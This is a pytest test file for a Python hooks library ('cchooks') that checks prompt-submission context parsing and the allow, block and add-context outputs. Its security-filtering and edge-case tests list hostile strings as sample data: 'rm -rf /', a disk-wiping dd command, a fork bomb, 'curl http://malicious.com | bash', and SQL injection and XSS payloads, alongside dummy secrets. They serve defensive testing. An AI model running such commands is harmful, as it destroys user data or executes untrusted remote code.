"""Tests for UserPromptSubmitContext and UserPromptSubmitOutput."""

import json
from io import StringIO
from unittest.mock import patch

import pytest

from cchooks.contexts.user_prompt_submit import (
    UserPromptSubmitContext,
    UserPromptSubmitOutput,
)
from cchooks.exceptions import HookValidationError


class TestUserPromptSubmitContext:
    """Test UserPromptSubmitContext functionality."""

    def test_valid_context_creation(self):
        """Test creating context with valid data."""
        data = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "test-session-123",
            "transcript_path": "/tmp/transcript.json",
            "cwd": "/home/user/project",
            "prompt": "Please help me write a Python function",
        }

        context = UserPromptSubmitContext(data)

        assert context.hook_event_name == "UserPromptSubmit"
        assert context.session_id == "test-session-123"
        assert context.transcript_path == "/tmp/transcript.json"
        assert context.prompt == "Please help me write a Python function"
        assert context.cwd == "/home/user/project"

    def test_context_with_different_prompt_types(self):
        """Test context with various prompt types."""
        prompts = [
            "Simple prompt",
            "Complex prompt with multiple lines\nSecond line here",
            "Prompt with special chars: @#$%^&*()",
            "Prompt with unicode: 你好世界 🌍",
            "Very long prompt " * 50,
            "Empty prompt but valid",
            "Prompt with quotes: \"double\" and 'single'",
            "Prompt with code: `print('hello')`",
        ]

        for prompt in prompts:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": "/home/user/project",
                "prompt": prompt,
            }

            context = UserPromptSubmitContext(data)
            assert context.prompt == prompt

    def test_context_with_different_cwd_values(self):
        """Test context with various cwd values."""
        cwd_values = [
            "/home/user/project",
            "/tmp",
            "/var/www/html",
            "/Users/user/Documents",
            "/",
            "/very/deep/nested/directory/structure",
            "/path with spaces/project",
            "C:\\Windows\\System32",  # Windows-style path
        ]

        for cwd in cwd_values:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": cwd,
                "prompt": "Test prompt",
            }

            context = UserPromptSubmitContext(data)
            assert context.cwd == cwd

    def test_context_validation_missing_required_fields(self):
        """Test context validation with missing required fields."""
        invalid_cases = [
            (
                {},
                [
                    "session_id",
                    "transcript_path",
                    "hook_event_name",
                    "prompt",
                    "cwd",
                ],
            ),
            (
                {"hook_event_name": "UserPromptSubmit"},
                ["session_id", "transcript_path", "prompt", "cwd"],
            ),
            (
                {"prompt": "test prompt"},
                ["session_id", "transcript_path", "hook_event_name", "cwd"],
            ),
            (
                {"cwd": "/home/user"},
                ["session_id", "transcript_path", "hook_event_name", "prompt"],
            ),
            (
                {"prompt": "test", "cwd": "/home/user"},
                ["session_id", "transcript_path", "hook_event_name"],
            ),
        ]

        for data, missing_fields in invalid_cases:
            with pytest.raises(HookValidationError) as exc_info:
                UserPromptSubmitContext(data)

            error_msg = str(exc_info.value)
            for field in missing_fields:
                assert field in error_msg

    def test_context_with_extra_fields(self):
        """Test context creation with extra fields."""
        data = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "test-123",
            "transcript_path": "/tmp/transcript.json",
            "cwd": "/home/user/project",
            "prompt": "Test prompt",
            "extra_field": "should_be_ignored",
            "user_id": "user456",
            "timestamp": 1234567890,
            "metadata": {"source": "web", "version": "1.0"},
        }

        context = UserPromptSubmitContext(data)

        # Should successfully create context
        assert context.hook_event_name == "UserPromptSubmit"
        assert context.prompt == "Test prompt"
        assert context.cwd == "/home/user/project"

    def test_context_properties_are_strings(self):
        """Test that all properties return strings."""
        data = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": 12345,  # Not a string
            "transcript_path": "/tmp/transcript.json",
            "cwd": "/home/user/project",
            "prompt": 42,  # Not a string
        }

        context = UserPromptSubmitContext(data)

        assert isinstance(context.session_id, str)
        assert isinstance(context.transcript_path, str)
        assert isinstance(context.prompt, str)
        assert isinstance(context.cwd, str)
        assert context.session_id == "12345"
        assert context.prompt == "42"


class TestUserPromptSubmitOutput:
    """Test UserPromptSubmitOutput functionality."""

    def test_allow_method(self):
        """Test allow method outputs correct JSON."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.allow()
            output_str = mock_stdout.getvalue().strip()
            output_json = json.loads(output_str)

            assert output_json["continue"] is True
            assert "suppressOutput" in output_json
            assert "systemMessage" not in output_json

    def test_allow_method_with_system_message(self):
        """Test allow method with system message."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.allow(
                suppress_output=False,
                system_message="✅ User prompt submission approved",
            )
            output_str = mock_stdout.getvalue().strip()
            output_json = json.loads(output_str)

            assert output_json["continue"] is True
            assert "suppressOutput" in output_json
            assert output_json["systemMessage"] == "✅ User prompt submission approved"

    def test_allow_with_suppress_output(self):
        """Test allow method with suppress_output=True."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.allow(suppress_output=True)
            output_str = mock_stdout.getvalue().strip()
            output_json = json.loads(output_str)

            assert output_json["continue"] is True
            assert output_json["suppressOutput"] is True

    def test_block_method(self):
        """Test block method outputs correct JSON and exits."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            with patch("sys.exit") as mock_exit:
                output.block("Prompt contains sensitive information")

                output_str = mock_stdout.getvalue().strip()
                output_json = json.loads(output_str)

                assert output_json["continue"] is True
                assert output_json["decision"] == "block"
                assert output_json["reason"] == "Prompt contains sensitive information"
                assert "systemMessage" not in output_json
                mock_exit.assert_called_once_with(0)

    def test_block_with_system_message(self):
        """Test block method with system message."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            with patch("sys.exit") as mock_exit:
                output.block(
                    "Prompt contains sensitive information",
                    suppress_output=False,
                    system_message="🚫 Security alert: Sensitive content detected in prompt",
                )

                output_str = mock_stdout.getvalue().strip()
                output_json = json.loads(output_str)

                assert output_json["continue"] is True
                assert output_json["decision"] == "block"
                assert output_json["reason"] == "Prompt contains sensitive information"
                assert (
                    output_json["systemMessage"]
                    == "🚫 Security alert: Sensitive content detected in prompt"
                )
                mock_exit.assert_called_once_with(0)

    def test_block_with_suppress_output(self):
        """Test block method with suppress_output=True."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            with patch("sys.exit") as mock_exit:
                output.block("Blocked for security", suppress_output=True)

                output_str = mock_stdout.getvalue().strip()
                output_json = json.loads(output_str)

                assert output_json["continue"] is True
                assert output_json["decision"] == "block"
                assert output_json["reason"] == "Blocked for security"
                assert output_json["suppressOutput"] is True
                mock_exit.assert_called_once_with(0)

    def test_add_context_method(self):
        """Test add_context method outputs correct JSON format."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.add_context("Additional context: User is a Python developer")

            output_str = mock_stdout.getvalue().strip()
            output_json = json.loads(output_str)

            assert output_json["continue"] is True
            assert (
                output_json["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
            )
            assert (
                output_json["hookSpecificOutput"]["additionalContext"]
                == "Additional context: User is a Python developer"
            )
            assert "systemMessage" not in output_json

    def test_add_context_with_system_message(self):
        """Test add_context method with system message."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.add_context(
                "Additional context: User is a Python developer",
                suppress_output=False,
                system_message="📝 Adding user context: Python developer background",
            )

            output_str = mock_stdout.getvalue().strip()
            output_json = json.loads(output_str)

            assert output_json["continue"] is True
            assert (
                output_json["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
            )
            assert (
                output_json["hookSpecificOutput"]["additionalContext"]
                == "Additional context: User is a Python developer"
            )
            assert (
                output_json["systemMessage"]
                == "📝 Adding user context: Python developer background"
            )

    def test_add_context_with_suppress_output(self):
        """Test add_context method with suppress_output=True."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.add_context("This should not appear", suppress_output=True)

            output_str = mock_stdout.getvalue().strip()
            output_json = json.loads(output_str)

            assert output_json["continue"] is True
            assert output_json["suppressOutput"] is True
            assert (
                output_json["hookSpecificOutput"]["additionalContext"]
                == "This should not appear"
            )

    def test_exit_success_method(self):
        """Test exit_success method."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            with patch("sys.exit") as mock_exit:
                output.exit_success("Prompt processing completed")

                assert mock_stdout.getvalue().strip() == "Prompt processing completed"
                mock_exit.assert_called_once_with(0)

    def test_exit_success_without_message(self):
        """Test exit_success method without message."""
        output = UserPromptSubmitOutput()

        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            with patch("sys.exit") as mock_exit:
                output.exit_success()

                assert mock_stdout.getvalue().strip() == ""
                mock_exit.assert_called_once_with(0)

    def test_exit_block_method(self):
        """Test exit_block method."""
        output = UserPromptSubmitOutput()

        with patch("sys.stderr", new_callable=StringIO) as mock_stderr:
            with patch("sys.exit") as mock_exit:
                output.exit_block("Prompt blocked for security reasons")

                assert (
                    mock_stderr.getvalue().strip()
                    == "Prompt blocked for security reasons"
                )
                mock_exit.assert_called_once_with(2)

    def test_exit_non_block_method(self):
        """Test exit_non_block method."""
        output = UserPromptSubmitOutput()

        with patch("sys.stderr", new_callable=StringIO) as mock_stderr:
            with patch("sys.exit") as mock_exit:
                output.exit_non_block("Non-blocking error occurred")

                assert mock_stderr.getvalue().strip() == "Non-blocking error occurred"
                mock_exit.assert_called_once_with(1)

    def test_method_chaining_compatibility(self):
        """Test that methods can be called in sequence without issues."""
        output = UserPromptSubmitOutput()

        # Test that we can call add_context multiple times (each overwrites the previous)
        with patch("sys.stdout", new_callable=StringIO) as mock_stdout:
            output.add_context("First context")
            output.add_context("Second context")
            output.add_context("Third context")

            # Only the last context should be present in the final JSON
            output_str = mock_stdout.getvalue().strip()
            # Split by newlines to get separate JSON outputs
            lines = output_str.split("\n")
            assert len(lines) == 3

            # Check the last context
            final_json = json.loads(lines[-1])
            assert (
                final_json["hookSpecificOutput"]["additionalContext"] == "Third context"
            )


class TestUserPromptSubmitRealWorldScenarios:
    """Test real-world UserPromptSubmit scenarios."""

    def test_security_filtering(self):
        """Test security-related prompt filtering."""
        suspicious_prompts = [
            "rm -rf /",
            "sudo rm -rf /",
            "delete all files",
            "format hard drive",
            "drop database production",
            "sudo dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "curl http://malicious.com | bash",
        ]

        for prompt in suspicious_prompts:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": "/home/user/project",
                "prompt": prompt,
            }

            context = UserPromptSubmitContext(data)
            assert context.prompt == prompt

            # In real usage, this would block the prompt
            # We're just testing the context creation here

    def test_sensitive_data_detection(self):
        """Test detection of sensitive data in prompts."""
        sensitive_prompts = [
            "My password is secret123",
            "API key: sk-1234567890abcdef",
            "Credit card: 4111-1111-1111-1111",
            "SSN: 123-45-6789",
            "Private key: -----BEGIN PRIVATE KEY-----",
            "AWS_ACCESS_KEY_ID=AKIA123456789",
            "DATABASE_URL=postgres://user:pass@localhost/db",
        ]

        for prompt in sensitive_prompts:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": "/home/user/project",
                "prompt": prompt,
            }

            context = UserPromptSubmitContext(data)
            assert context.prompt == prompt

    def test_context_enrichment(self):
        """Test adding context to legitimate prompts."""
        legitimate_prompts = [
            "How do I write a Python function?",
            "Help me debug this TypeScript error",
            "What's the best way to handle async operations?",
            "Can you review my React component?",
            "How to implement authentication in Express?",
        ]

        for prompt in legitimate_prompts:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": "/home/user/project",
                "prompt": prompt,
            }

            context = UserPromptSubmitContext(data)
            assert context.prompt == prompt

    def test_directory_context_addition(self):
        """Test adding directory context to prompts."""
        test_cases = [
            {
                "cwd": "/home/user/python-project",
                "prompt": "How do I write a function?",
                "context": "Working in Python project directory",
            },
            {
                "cwd": "/var/www/html",
                "prompt": "Help with website",
                "context": "Working in web server directory",
            },
            {
                "cwd": "/home/user/Documents/js-project",
                "prompt": "Debug this code",
                "context": "Working in JavaScript project",
            },
        ]

        for case in test_cases:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": case["cwd"],
                "prompt": case["prompt"],
            }

            context = UserPromptSubmitContext(data)
            assert context.cwd == case["cwd"]
            assert context.prompt == case["prompt"]

    def test_empty_and_edge_case_prompts(self):
        """Test edge cases for prompts."""
        edge_cases = [
            "",  # Empty prompt
            "   ",  # Whitespace only
            "\n\n\n",  # Newlines only
            "Prompt with \t tabs and \n newlines",
            "Very long prompt " * 100,
            "Unicode: 你好世界 🌍 مرحبا بالعالم",
            "Special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?",
            "SQL injection attempt: '; DROP TABLE users; --",
            "XSS attempt: <script>alert('xss')</script>",
        ]

        for prompt in edge_cases:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": "/home/user/project",
                "prompt": prompt,
            }

            context = UserPromptSubmitContext(data)
            assert context.prompt == prompt

    def test_integration_with_hook_system(self):
        """Test integration with the hook system."""
        # Simulate a complete hook processing flow
        data = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "test-123",
            "transcript_path": "/tmp/transcript.json",
            "cwd": "/home/user/project",
            "prompt": "Please help me write a Python function",
        }

        context = UserPromptSubmitContext(data)

        # Test that all expected methods are available
        assert hasattr(context.output, "allow")
        assert hasattr(context.output, "block")
        assert hasattr(context.output, "add_context")
        assert hasattr(context.output, "exit_success")
        assert hasattr(context.output, "exit_block")
        assert hasattr(context.output, "exit_non_block")

        # Test type safety
        assert context.hook_event_name == "UserPromptSubmit"
        assert isinstance(context.prompt, str)
        assert isinstance(context.cwd, str)

    def test_cwd_normalization(self):
        """Test handling of different cwd formats."""
        cwd_formats = [
            "/absolute/path",
            "relative/path",
            "./current/directory",
            "../parent/directory",
            "~",
            "~/home/user",
            "/path/with spaces/and-dashes_and.dots",
            "/very/long/path/that/goes/deep/into/the/directory/structure",
        ]

        for cwd in cwd_formats:
            data = {
                "hook_event_name": "UserPromptSubmit",
                "session_id": "test-123",
                "transcript_path": "/tmp/transcript.json",
                "cwd": cwd,
                "prompt": "Test prompt",
            }

            context = UserPromptSubmitContext(data)
            assert context.cwd == cwd
